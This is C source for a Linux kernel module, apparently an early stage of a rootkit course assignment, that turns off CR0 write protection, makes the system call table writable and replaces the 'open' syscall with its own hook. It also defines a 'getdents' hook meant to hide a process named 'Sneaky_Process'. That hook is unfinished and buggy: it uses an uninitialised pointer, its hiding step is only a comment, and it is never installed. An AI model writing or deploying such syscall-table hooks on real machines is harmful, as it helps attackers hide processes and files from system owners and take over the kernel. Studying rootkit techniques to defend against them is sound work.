#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/syscalls.h>
#include <linux/slab.h>
/*
#include <sys/syscall.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
*/
//#include <dirent.h>
#define BUFFLEN 1024

//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

//interpret linux Dirent correctly:
struct linux_dirent {
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  char d_name[BUFFLEN];
};

//Global Variables for insmod: just need PID
static int   pid = -1;
//obtain PID from outer program
module_param(pid, int, 0);



//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff810707b0;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81070730;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_call)(const char *pathname, int flags);

//Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags)
{
  printk(KERN_INFO "Very, very Sneaky!\n");
  return original_call(pathname, flags);
}


asmlinkage int (*getdents_original)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);

asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
  printk(KERN_INFO "Sneaky Get DENTS!\n");

  //initial Direct structure
  struct linux_dirent *dir;

  //cast dirent structure to char * to manipulate byte by byte
  char *exact = (char *) dir;
  //allocate memory for count bytes associated with all dirents read for specific file descriptor 
  //we are in kernel space so allocate memory from kernel memory
  char *mem = kmalloc(count, GFP_KERNEL);

  //Need to allow kernel addresses to span Kernel Virtual Memory space with below lines
  

  //save previous address space value: want this restored so we don't give access to Kernel address space
  //beyond our below system calls
  mm_segment_t userspace = get_fs();
  //the below macro allows us to pass addresses derived from Kernel Space to our system calls 
  set_fs(KERNEL_DS);
  //we cast as dirent but have as char * so we can increment byte stream 1 byte at a time
  int numbytes = getdents_original(fd, (struct linux_dirent*) exact, count);
  //ensure addresses are once again only in user space
  set_fs(userspace);

  //iterate through numbytes and compare name to "Sneaky_Process" --> skip that one before returning
  
  return numbytes;
}


//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_ALERT "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  original_call = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  printk(KERN_ALERT "Hello process ID is: %i!\n", pid);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_call;

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  printk(KERN_INFO "Cleaning up module.\n");
}  

//allows renaming of cleanup and init functions
module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  

